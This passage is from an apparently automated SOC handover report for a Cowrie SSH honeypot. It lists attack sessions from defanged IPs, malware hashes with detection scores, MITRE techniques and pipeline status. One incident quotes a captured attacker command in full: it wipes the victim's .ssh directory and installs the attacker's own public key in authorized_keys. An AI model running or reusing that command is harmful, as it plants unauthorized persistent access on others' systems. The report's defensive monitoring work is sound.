| `2026-05-11 11:06:33` | `cowrie.session.params` |
| `2026-05-11 11:06:33` | `cowrie.command.input` |
| `2026-05-11 11:06:33` | `cowrie.command.failed` |
| `2026-05-11 11:06:33` | `cowrie.log.closed` |
| `2026-05-11 11:06:34` | `cowrie.session.params` |
| `2026-05-11 11:06:34` | `cowrie.command.input` |
| `2026-05-11 11:06:34` | `cowrie.session.file_download` |
| `2026-05-11 11:06:34` | `cowrie.log.closed` |
| `2026-05-11 11:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54c78c804fc

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-11 11:06 |
| **Last Seen** | 2026-05-11 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 11:06:37` | `cowrie.session.connect` |
| `2026-05-11 11:06:37` | `cowrie.client.version` |
| `2026-05-11 11:06:37` | `cowrie.client.kex` |
| `2026-05-11 11:06:38` | `cowrie.login.success` |
| `2026-05-11 11:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7502316c1926

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-11 11:20 |
| **Last Seen** | 2026-05-11 11:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 11:20:00` | `cowrie.session.connect` |
| `2026-05-11 11:20:00` | `cowrie.client.version` |
| `2026-05-11 11:20:01` | `cowrie.client.kex` |
| `2026-05-11 11:20:01` | `cowrie.login.success` |
| `2026-05-11 11:20:02` | `cowrie.session.params` |
| `2026-05-11 11:20:02` | `cowrie.command.input` |
| `2026-05-11 11:20:02` | `cowrie.command.failed` |
| `2026-05-11 11:20:02` | `cowrie.log.closed` |
| `2026-05-11 11:20:02` | `cowrie.session.params` |
| `2026-05-11 11:20:02` | `cowrie.command.input` |
| `2026-05-11 11:20:03` | `cowrie.session.file_download` |
| `2026-05-11 11:20:03` | `cowrie.log.closed` |
| `2026-05-11 11:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8750d0954982

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-11 11:20 |
| **Last Seen** | 2026-05-11 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 11:20:05` | `cowrie.session.connect` |
| `2026-05-11 11:20:05` | `cowrie.client.version` |
| `2026-05-11 11:20:05` | `cowrie.client.kex` |
| `2026-05-11 11:20:07` | `cowrie.login.success` |
| `2026-05-11 11:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.121.145[.]41` | **81** | 2026-05-11 10:02 | 2026-05-11 11:26 | 42m | 0 | `T1592` | 🟠 MEDIUM |
| `119.205.179[.]217` | **30** | 2026-05-11 09:36 | 2026-05-11 10:06 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.253.37[.]225` | **30** | 2026-05-11 09:28 | 2026-05-11 10:44 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.158.22[.]150` | **29** | 2026-05-11 10:47 | 2026-05-11 11:25 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.198[.]162` | **26** | 2026-05-11 08:57 | 2026-05-11 10:20 | 3m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.106[.]235` | **25** | 2026-05-11 08:08 | 2026-05-11 08:26 | 20m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `199.45.154[.]158` | **4** | 2026-05-11 11:08 | 2026-05-11 11:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.79.6[.]62` | **3** | 2026-05-11 08:11 | 2026-05-11 08:13 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.10[.]94` | **2** | 2026-05-11 08:32 | 2026-05-11 08:33 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.38.149[.]131` | **2** | 2026-05-11 09:26 | 2026-05-11 09:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `114.98.230[.]202` | 1 | 2026-05-11 08:05 | 2026-05-11 08:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.55.245[.]26` | 1 | 2026-05-11 09:23 | 2026-05-11 09:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.106[.]86` | 1 | 2026-05-11 08:06 | 2026-05-11 08:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]107` | 1 | 2026-05-11 08:02 | 2026-05-11 08:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]212` | 1 | 2026-05-11 10:54 | 2026-05-11 10:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]97` | 1 | 2026-05-11 09:28 | 2026-05-11 09:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.95.25[.]34` | 1 | 2026-05-11 09:18 | 2026-05-11 09:18 | 42s | 0 | `T1592` | 🟢 LOW |
| `180.106.83[.]59` | 1 | 2026-05-11 09:24 | 2026-05-11 09:24 | 23s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-05-11 08:08 | 2026-05-11 08:08 | 5s | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-05-11 08:04 | 2026-05-11 08:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `23.111.14[.]189` | 1 | 2026-05-11 08:20 | 2026-05-11 08:20 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `116.110.10[.]94` | VN | Viettel Group | **100** ⚠️ | 2 |
| `185.38.149[.]131` | GB | Hydra Communications Ltd | **100** ⚠️ | 50 |
| `196.204.71[.]189` | EG | Local ISP | **100** ⚠️ | 50 |
| `45.121.145[.]41` | MY | Invision Seven Solutions | **100** ⚠️ | 1 |
| `23.111.14[.]189` | SG | Leaseweb Asia Pacific pte. ltd. | **100** ⚠️ | 50 |
| `27.79.6[.]62` | VN | Viettel Group | **100** ⚠️ | 1 |
| `119.205.179[.]217` | KR | Korea Telecom | **100** ⚠️ | 31 |
| `180.106.83[.]59` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `199.45.154[.]158` | HK | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 168 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (73 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 25 |
| AbuseIPDB score 10 below threshold 25 | 7 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 14 |
| AbuseIPDB score 5 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 333 cases |
| Tool 34  | Credential Extractor        | ✅ 137 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 47 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 73 filtered (21.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 21 recon entry/entries in table (10 group(s) consolidating 232 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-11T11:28:52Z_
